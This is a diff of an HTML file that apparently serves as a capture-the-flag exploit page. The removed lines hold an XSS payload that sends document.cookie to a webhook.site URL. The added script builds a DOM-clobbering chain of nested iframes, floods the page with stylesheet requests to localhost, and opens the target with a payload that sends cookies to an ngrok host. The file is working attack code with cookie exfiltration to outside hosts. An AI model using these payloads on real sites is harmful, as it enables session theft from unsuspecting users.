@@ -1,10 +1,45 @@
 <!DOCTYPE html>
 <html>
-<body onload="fetch('https://webhook.site/c5aa3ea9-1ac5-49ad-8a1b-0c1d58001d17?c='+document[&#34;coo&#34;+&#34;kie&#34;])">
-owl owl
-<!-- <IMG SRC=/ onerror="fetch('https://webhook.site/c5aa3ea9-1ac5-49ad-8a1b-0c1d58001d17')"></img> -->
-<h1>My First Heading</h1>
-<p>My first paragraph.</p>
+<body>
+  <script>
+    
+    var arr=['h', 'a' , 'p', 'p' , 'y' , '_' , 'n' , 'e' , 'w' , '_' , 'y' , 'e' , 'a' , 'r' , '_' , 'h' , 'a' , 'c' , 'k' , 'e' , 'r' , 's']
+    
+    let clobbering_value = "a=1;"
+
+    const chainIframes = function(clobbering_target, n){
+        if (clobbering_target.length - 1 === n){
+            return `<a id='${clobbering_target[n]}'${clobbering_value ? ` href='${clobbering_value}'` : ''}></a>`
+            }   
+
+
+        let html = `<iframe name=${clobbering_target[n]} srcdoc="\n${"  ".repeat(n + 1) + chainIframes(clobbering_target, n + 1) + "\n" + "  ".repeat(n)}"></iframe>`;
+
+        if (n === 1) html = html.replace(/"/g, '&quot;')
+        else if (n > 1) html = html.replace(/"/g, '&quot;').replace(/&/g, "&amp;");
+
+        return html;
+    }
+
+    let dom_clobbering_part=chainIframes(arr, 0);
+
+    payload = dom_clobbering_part + '<link rel="stylesheet" href="?0"/><link rel="stylesheet" href="?1"/><link rel="stylesheet" href="?2"/><link rel="stylesheet" href="?3"/><link rel="stylesheet" href="?4"/><link rel="stylesheet" href="?5"/><link rel="stylesheet" href="?6"/><link rel="stylesheet" href="?7"/><link rel="stylesheet" href="?8"/><link rel="stylesheet" href="?9"/><link rel="stylesheet" href="?10"/><link rel="stylesheet" href="?11"/><link rel="stylesheet" href="?12"/><link rel="stylesheet" href="?13"/><link rel="stylesheet" href="?14"/><link rel="stylesheet" href="?15"/><link rel="stylesheet" href="?16"/><link rel="stylesheet" href="?17"/><link rel="stylesheet" href="?18"/><link rel="stylesheet" href="?19"/><link rel="stylesheet" href="?20"/><link rel="stylesheet" href="?21"/><link rel="stylesheet" href="?22"/><link rel="stylesheet" href="?23"/><link rel="stylesheet" href="?24"/><link rel="stylesheet" href="?25"/>'
+    payload = encodeURIComponent(payload)
+    console.log(payload)
+
+    function startStyle() {
+        for(let i=0; i<2000; i++){
+            let el = document.createElement('link')
+            el.rel='stylesheet'
+            el.href = 'http://localhost:9000/?'+i
+            document.body.appendChild(el)
+        }
+    }
+    startStyle()
+    setTimeout(() => {
+      window.open('http://localhost:9000?p='+payload, "location='http://test.ngrok.io/flag?q='+document.cookie")
+    }, 100)
+
+  </script>
 </body>
 </html>
-
